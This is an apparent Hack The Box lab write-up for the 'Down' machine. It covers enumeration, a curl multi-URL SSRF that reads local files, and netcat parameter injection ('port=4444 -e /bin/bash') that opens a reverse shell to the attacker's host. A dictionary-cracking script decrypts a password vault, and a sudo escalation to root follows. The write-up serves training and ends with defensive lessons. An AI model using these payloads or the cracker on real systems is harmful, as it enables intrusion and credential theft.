---
layout: post
title: "[HTB] Down"
description: "[Machine] - Easy difficulty"
background: /img/bg-machine.jpg
tags: [htb]
difficulty: Easy
---
![](/img/htb_img/Down_img/img1.png)

- OS: Linux
- Release Date: 17 Jun 2025
- Difficulty: Easy

# Enumeration
## Nmap recon
```
â¯ sudo nmap -p- --min-rate 5000 --open -sS -n -Pn -oG allports $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-18 17:11 CEST
Nmap scan report for 10.129.217.203
Host is up (0.11s latency).
Not shown: 50067 closed tcp ports (reset), 15466 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 17.17 seconds
```

Scripts and versions.
```
â¯ extractPorts allports
â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
       â”‚ File: extractPorts.tmp
â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   1   â”‚ 
   2   â”‚ [*] Extracting information...
   3   â”‚ 
   4   â”‚     [*] IP Address: 10.129.217.203
   5   â”‚     [*] Open ports: 22,80
   6   â”‚ 
   7   â”‚ [*] Ports copied to clipboard
   8   â”‚ 
â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
â¯ nmap -p22,80 -sCV -Pn -oN targeted $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-18 17:13 CEST
Nmap scan report for 10.129.217.203
Host is up (0.10s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f6:cc:21:7c:ca:da:ed:34:fd:04:ef:e6:f9:4c:dd:f8 (ECDSA)
|_  256 fa:06:1f:f4:bf:8c:e3:b0:c8:40:21:0d:57:06:dd:11 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Is it down or just me?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.53 seconds
```

Findings:
- **22/tcp** â€“ OpenSSH (Ubuntu build)
- **80/tcp** â€“ Apache httpd with a single PHP page
Given Apache+PHP and only one web port, the foothold is likely web-centric.

## TCP 80: HTTP
### App behavior
![](/img/htb_img/Down_img/img2.png)
The landing page is a tiny utility: â€œIs that website down, or is it just you?â€. 

![](/img/htb_img/Down_img/img3.png)
Submitting any URL triggers a server-side check and prints a friendly status message. 

```
â¯ nc -lvnp 80
listening on [any] 80 ...
connect to [10.10.14.97] from (UNKNOWN) [10.129.217.203] 51842
GET / HTTP/1.1
Host: 10.10.14.97
User-Agent: curl/7.81.0
Accept: */*
```
When I point it at a listener on my box, the incoming requestâ€™s headers clearly show **curl/7.81.0** as the user agent, which `suggests the backend shells out to curl.`

### Directory fuzzing
A quick brute-force for common files/paths and PHP endpoints:
```bash
â¯ feroxbuster -u http://$target -x php -t 50
                                                                                                                                                                                                                                       
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher ğŸ¤“                 ver: 2.11.0
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ¯  Target Url            â”‚ http://10.129.217.203
 ğŸš€  Threads               â”‚ 50
 ğŸ“–  Wordlist              â”‚ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 ğŸ‘Œ  Status Codes          â”‚ All Status Codes!
 ğŸ’¥  Timeout (secs)        â”‚ 7
 ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.11.0
 ğŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml
 ğŸ”  Extract Links         â”‚ true
 ğŸ’²  Extensions            â”‚ [php]
 ğŸ  HTTP methods          â”‚ [GET]
 ğŸ”ƒ  Recursion Depth       â”‚ 4
 ğŸ‰  New Version Available â”‚ https://github.com/epi052/feroxbuster/releases/latest
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       27l       70w      739c http://10.129.217.203/index.php
200      GET     1302l     7419w   578132c http://10.129.217.203/logo.png
301      GET        9l       28w      321c http://10.129.217.203/javascript => http://10.129.217.203/javascript/
200      GET       93l      207w     1794c http://10.129.217.203/style.css
200      GET       27l       70w      739c http://10.129.217.203/
301      GET        9l       28w      328c http://10.129.217.203/javascript/jquery => http://10.129.217.203/javascript/jquery/
200      GET    10879l    44396w   288550c http://10.129.217.203/javascript/jquery/jquery
```

Only the root `index.php`, assets (`style.css`, `logo.png`), and a `javascript/` folder show up-no admin paths, no api, nothing juicy. So the page we see is probably the page we need to break.

# Foothold
## SSRF â†’ local file read via curl multi-URL quirk
The form parameter appears to be validated to only accept `http://` / `https://` at the beginning of the string. That blocks a simple `file://` SSRF. However, the execution path likely looks like this:
```php
exec("/usr/bin/curl -s $url");
```

If the backend really passes our input straight to curl, we can abuse a neat curl feature: **multiple URLs in one invocation**. curl will happily fetch `curl <URL1> <URL2> ...`. If the code only checks that the input _starts_ with `http` and then hands it to curl, we can prepend a dummy HTTP URL and then add a **second** URL using the `file://` scheme to read local files.
Payload concept:
```
url=http://+file:///etc/hostname
```

That is: `http://` (validates past the regex) + space + `file:///...`. curl treats them as two URLs and will request both. The frontend typically dumps curlâ€™s output inside a `<pre>` block-so we can parse the response body to extract the file content.

Response:
![](/img/htb_img/Down_img/img4.png)
This confirms weâ€™re running under Apache as **www-data**, working directory `/var/www/html`, etc.

## Source code disclosure
With the same trick we can fetch the webroot file:
```bash
url=http:// file:///proc/self/cwd/index.php
```

Content:
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Is it down or just me?</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <header>
        <img src="/logo.png" alt="Logo">
        <h2>Is it down or just me?</h2>
    </header>

    <div class="container">

<?php
if ( isset($_GET['expertmode']) && $_GET['expertmode'] === 'tcp' ) {
  echo '<h1>Is the port refused, or is it just you?</h1>
        <form id="urlForm" action="index.php?expertmode=tcp" method="POST">
            <input type="text" id="url" name="ip" placeholder="Please enter an IP." required><br>
            <input type="number" id="port" name="port" placeholder="Please enter a port number." required><br>
            <button type="submit">Is it refused?</button>
        </form>';
} else {
  echo '<h1>Is that website down, or is it just you?</h1>
        <form id="urlForm" action="index.php" method="POST">
            <input type="url" id="url" name="url" placeholder="Please enter a URL." required><br>
            <button type="submit">Is it down?</button>
        </form>';
}

if ( isset($_GET['expertmode']) && $_GET['expertmode'] === 'tcp' && isset($_POST['ip']) && isset($_POST['port']) ) {
  $ip = trim($_POST['ip']);
  $valid_ip = filter_var($ip, FILTER_VALIDATE_IP);
  $port = trim($_POST['port']);
  $port_int = intval($port);
  $valid_port = filter_var($port_int, FILTER_VALIDATE_INT);
  if ( $valid_ip && $valid_port ) {
    $rc = 255; $output = '';
    $ec = escapeshellcmd("/usr/bin/nc -vz $ip $port");
    exec($ec . " 2>&1",$output,$rc);
    echo '<div class="output" id="outputSection">';
    if ( $rc === 0 ) {
      echo "<font size=+1>It is up. It's just you! ğŸ˜</font><br><br>";
      echo '<p id="outputDetails"><pre>'.htmlspecialchars(implode("\n",$output)).'</pre></p>';
    } else {
      echo "<font size=+1>It is down for everyone! ğŸ˜”</font><br><br>";
      echo '<p id="outputDetails"><pre>'.htmlspecialchars(implode("\n",$output)).'</pre></p>';
    }
  } else {
    echo '<div class="output" id="outputSection">';
    echo '<font color=red size=+1>Please specify a correct IP and a port between 1 and 65535.</font>';
  }
} elseif (isset($_POST['url'])) {
  $url = trim($_POST['url']);
  if ( preg_match('|^https?://|',$url) ) {
    $rc = 255; $output = '';
    $ec = escapeshellcmd("/usr/bin/curl -s $url");
    exec($ec . " 2>&1",$output,$rc);
    echo '<div class="output" id="outputSection">';
    if ( $rc === 0 ) {
      echo "<font size=+1>It is up. It's just you! ğŸ˜</font><br><br>";
      echo '<p id="outputDetails"><pre>'.htmlspecialchars(implode("\n",$output)).'</pre></p>';
    } else {
      echo "<font size=+1>It is down for everyone! ğŸ˜”</font><br><br>";
    }
  } else {
    echo '<div class="output" id="outputSection">';
    echo '<font color=red size=+1>Only protocols http or https allowed.</font>';
  }
}
?>

</div>
</div>
<footer>Â© 2024 isitdownorjustme LLC</footer>
</body>
</html>
```

Reading `index.php` reveals two code paths:
1. the normal curl-based URL checker, and
2. an **Expert Mode** gated behind `?expertmode=tcp`, which exposes a raw TCP port check implemented by calling **netcat**.

Visiting `/index.php?expertmode=tcp` loads a second form that takes an IP and a port.
![](/img/htb_img/Down_img/img5.png)

## Parameter injection in netcat
The expert path **validates** the _integer-converted_ port (**`$port_int`**) but later constructs the command with the **original** string (**`$port`**). That defeats the intent of validation. `escapeshellcmd` blocks metacharacters for command injection, but it **does not** prevent **parameter injection**-we can still pass valid-looking option switches.

Classic netcat payload:
```
port=4444 -e /bin/bash
```

`intval("4444 -e /bin/bash")` equals `4444` (passes validation), but the actual command becomes:
```
/usr/bin/nc -vz <OUR_IP> 4444 -e /bin/bash
```

Many nc builds support `-e` to exec a program upon connect. If _we_ are the remote host and have a listener on 443, the target will connect back and attach `/bin/bash` to our socket.

### Getting a shell
1. Start a listener on the attacker box:
```bash
penelope
```

2. Send the crafted request through Burp Repeater to bypass client-side form constraints. POST to `/index.php?expertmode=tcp` with URL-encoded body like:
```
ip=10.10.xx.xx&port=4444%20-e%20/bin/bash
```

3. When the HTTP request hangs, check the listener typing `id` should echo back under **www-data**.

Penelope auto upgrades the TTY for us.
If you are not using Penelope or other shell handler you can upgrade it by doing the following:
```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
reset
export TERM=xterm
```

We now have a stable **www-data** shell.

```
[####################] - 3m     30000/30000   178/s   http://10.129.217.203/javascript/jquery/                                                                                                                                         â¯ penelope
[+] Listening for reverse shells on 0.0.0.0:4444 â†’  127.0.0.1 â€¢ 192.168.226.139 â€¢ 172.17.0.1 â€¢ 172.18.0.1 â€¢ 10.10.xx.xx
â¤  ğŸ  Main Menu (m) ğŸ’€ Payloads (p) ğŸ”„ Clear (Ctrl-L) ğŸš« Quit (q/Ctrl-C)
[+] Got reverse shell from down~10.129.217.203-Linux-x86_64 ğŸ˜ï¸ Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! ğŸ’ª
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/down~10.129.217.203-Linux-x86_64/2025_10_18-17_37_29-741.log ğŸ“œ
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
www-data@down:/var/www/html$
```

#### User flag
```
www-data@down:/var/www/html$ cat user_aeT1xa.txt 
<REDACTED>
```
# Lateral Movement
## Local triage
- `/var/www/html/` contains only `index.php`, `style.css`, `logo.png` and the user flag.
- `/etc/apache2/sites-enabled/000-default.conf` shows a single vhost rooted at `/var/www/html`-no extra sites to pivot.
- `/home/` has one user: **aleks**. www-data can list inside but not read `~/.ssh`.

## Loot: a local password vault (pswm)
Inside `~aleks/.local/share/pswm/` thereâ€™s a file named `pswm`. The system has `/usr/bin/pswm` installed; itâ€™s a tiny Python-based password manager that uses the `cryptocode` library for symmetric encryption.

Rather than fight the full CLI (which errors under www-data due to XDG paths), we can replicate its decryption call and brute-force the master password with **rockyou.txt**.

### Quick-and-dirty offline cracker (local replica)
Minimal script logic (pseudocode style here for clarity):
```python
import cryptocode

pwsm_blob = open('pswm','r').read()
for pw in open('rockyou.txt', 'rb').read().decode(errors='ignore').splitlines():
    pt = cryptocode.decrypt(pwsm_blob, pw.strip())
    if pt:
        print('Master password:', pw)
        print(pt)
        break
```

In seconds it cracks the master key (a common dictionary word) and prints the decrypted table. One entry is an account for **aleks@down** with a strong-looking password. Use it to laterally move.

### User shell
```bash
â¯ ssh aleks@$target
(aleks@10.129.217.203) Password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-138-generic x86_64)

 System information as of Sat Oct 18 03:46:56 PM UTC 2025

  System load:           0.11
  Usage of /:            53.0% of 6.92GB
  Memory usage:          9%
  Swap usage:            0%
  Processes:             232
  Users logged in:       0
  IPv4 address for eth0: 10.129.217.203
  IPv6 address for eth0: dead:beef::250:56ff:feb0:2001
Last login: Sat Oct 18 15:46:57 2025 from 10.10.14.97
aleks@down:~$
```
Weâ€™re now **aleks**.

# Privilege Escalation

`sudo -l` for aleks is the jackpot:
```
User aleks may run the following commands on down:
    (ALL : ALL) ALL
```

So itâ€™s a straight escalation:
```bash
aleks@down:~$ sudo -i
[sudo] password for aleks: 
root@down:~# cat /root/root.txt 
<REDACTED>
root@down:~#
```
Grab the root flag.

# Takeaways
- **SSRF via curl multi-URL** is a powerful pattern: validate only the prefix â†’ sneak in a second URL of a different scheme.
- **Parameter injection** is not the same as command injection. Escaping metacharacters doesnâ€™t save you if you reuse the raw user string as an argument to a CLI that accepts switches.
- If you expose a TCP checker, prefer a safe library call (e.g., native sockets) instead of shelling out to netcat.
- Small, single-file password vaults often mean easy local offline attacks-look for the crypto call and mirror it.
